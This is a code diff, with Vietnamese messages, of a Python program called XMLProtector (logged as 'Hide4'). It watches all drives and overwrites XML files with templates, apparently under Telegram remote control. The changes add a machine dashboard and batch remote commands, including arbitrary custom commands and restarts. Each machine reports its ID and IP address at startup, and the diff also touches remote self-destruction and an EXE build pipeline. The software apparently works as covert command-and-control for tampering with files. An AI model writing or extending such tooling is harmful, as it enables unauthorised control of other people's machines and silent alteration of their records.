-        confirm_msg = f"🚨 <b>XÁC NHẬN GỠ BỎ XMLPROTECTOR</b>\n\n" \
-                     f"⚠️ <b>CẢNH BÁO:</b> Thao tác này sẽ:\n" \
-                     f"• Gỡ khỏi startup Windows\n" \
-                     f"• Xóa toàn bộ dữ liệu ứng dụng\n" \
-                     f"• Tắt hoàn toàn bảo vệ hệ thống\n\n" \
-                     f"🔥 <b>KHÔNG THỂ HOÀN TÁC!</b>\n" \
-                     f"📝 Chọn bên dưới để xác nhận:"
+        confirm_msg = """🚨 <b>XÁC NHẬN GỠ BỎ XMLPROTECTOR</b>
+
+⚠️ <b>CẢNH BÁO:</b>
+• Gỡ khỏi startup Windows
+• Xóa dữ liệu ứng dụng
+• Tắt bảo vệ hệ thống
+
+🔥 <b>KHÔNG THỂ HOÀN TÁC!</b>"""
         send_telegram_message(confirm_msg, confirm_keyboard)
     elif callback_data == 'confirm_destroy':
         destroy_xmlprotector()
     elif callback_data == 'build_mode':
-        build_mode_msg = f"🔧 <b>CHẾ ĐỘ BUILD EXE MỚI</b>\n\n" \
-                        f"📁 <b>Hướng dẫn:</b>\n" \
-                        f"1️⃣ Gửi file XML template (1-10 files)\n" \
-                        f"2️⃣ Bot sẽ tự động cập nhật templates\n" \
-                        f"3️⃣ Build EXE mới với PyInstaller\n" \
-                        f"4️⃣ Gửi lại EXE cho bạn\n\n" \
-                        f"⏱️ <b>Thời gian build:</b> 30-60 giây\n" \
-                        f"📱 <b>Hỗ trợ:</b> Gửi từ iPhone trực tiếp\n\n" \
-                        f"📤 <b>Bây giờ hãy gửi file XML vào nhóm!</b>"
-        send_telegram_message(build_mode_msg)
-        # Kích hoạt chế độ waiting for files
+        build_mode_msg = """🔧 <b>BUILD EXE MODE</b>
+
+📁 <b>Hướng dẫn:</b>
+1️⃣ Gửi file XML template
+2️⃣ Bot tự động cập nhật
+3️⃣ GitHub Actions build
+4️⃣ Bot gửi EXE về nhóm
+
+📤 <b>Gửi XML ngay!</b>"""
+        
+        build_keyboard = {
+            "inline_keyboard": [
+                [
+                    {"text": "❌ HỦY", "callback_data": "cancel_build"},
+                    {"text": "🔙 MENU", "callback_data": "menu"}
+                ]
+            ]
+        }
+        
+        send_telegram_message(build_mode_msg, build_keyboard)
         set_build_mode(True)
     elif callback_data == 'build_status':
         status_msg = get_build_status_message()
         send_telegram_message(status_msg)
     elif callback_data == 'github_status':
         check_github_build_status()
+    elif callback_data == 'machines':
+        show_machines_dashboard()
+    elif callback_data == 'health_check':
+        health_check_all_machines()
+    elif callback_data == 'batch_command':
+        show_batch_command_menu()
+    elif callback_data == 'batch_status':
+        execute_batch_status_check()
+    elif callback_data == 'batch_health':
+        execute_batch_health_check()
+    elif callback_data == 'batch_template':
+        execute_batch_template_update()
+    elif callback_data == 'batch_restart':
+        execute_batch_restart()
+    elif callback_data == 'batch_custom':
+        show_custom_command_input()
+    elif callback_data == 'cancel_build':
+        set_build_mode(False)
+        send_telegram_message("🚫 <b>Đã hủy BUILD MODE!</b>", {
+            "inline_keyboard": [[{"text": "🔙 MENU", "callback_data": "menu"}]]
+        })
 
 def set_build_mode(enabled):
     """Kích hoạt/tắt chế độ build - chờ nhận XML files"""
@@ -1244,14 +2020,21 @@ def start_monitor():
     send_remote_log("Phần mềm Hide4 khởi chạy", once=True)
     # add_to_startup()  # DISABLED to prevent duplicate processes
 
+    # Khởi tạo Machine Management System
+    init_machine_management()
+    
     templates = get_templates()
     template_count = len(templates)
     
-    # Send Telegram startup notification
+    # Send Telegram startup notification với Machine ID
     startup_msg = f"🛡️ <b>XMLProtector Khởi Động</b>\n" \
                   f"📁 Templates đã tải: {template_count}\n" \
                   f"🔍 Đang giám sát toàn bộ ổ đĩa\n" \
-                  f"⚡ Ghi đè thông minh: SẴN SÀNG"
+                  f"⚡ Ghi đè thông minh: SẴN SÀNG\n\n" \
+                  f"🤖 <b>Machine Management:</b>\n" \
+                  f"• Machine ID: <code>{MACHINE_ID}</code>\n" \
+                  f"• Platform: {MACHINE_INFO.get('platform', 'Unknown')}\n" \
+                  f"• IP: {MACHINE_INFO.get('ip_address', 'Unknown')}"
     send_telegram_message(startup_msg)
     
     tpl_map = { Path(p).stem.split('_')[-1]: p for p in templates }
@@ -1279,16 +2062,23 @@ def start_monitor():
         logging.error("❌ Telegram bot không khả dụng - tắt bot functions")
 
     try:
-        # Main loop với command processing
+        # Main loop với command processing tối ưu
         command_check_interval = 0
+        machine_status_interval = 0
         while True:
-            time.sleep(1)
+            time.sleep(0.5)  # Giảm từ 1s xuống 0.5s để phản hồi nhanh hơn
             
-            # Kiểm tra Telegram commands mỗi 5 giây
+            # Kiểm tra Telegram commands mỗi 2 giây thay vì 5 giây
             command_check_interval += 1
-            if command_check_interval >= 5:
+            if command_check_interval >= 4:  # 0.5s * 4 = 2s
                 process_telegram_commands()
                 command_check_interval = 0
+            
+            # Cập nhật machine status mỗi 5 phút
+            machine_status_interval += 1
+            if machine_status_interval >= 600:  # 0.5s * 600 = 5 phút
+                update_machine_status()
+                machine_status_interval = 0
                 
     except KeyboardInterrupt:
         observer.stop()
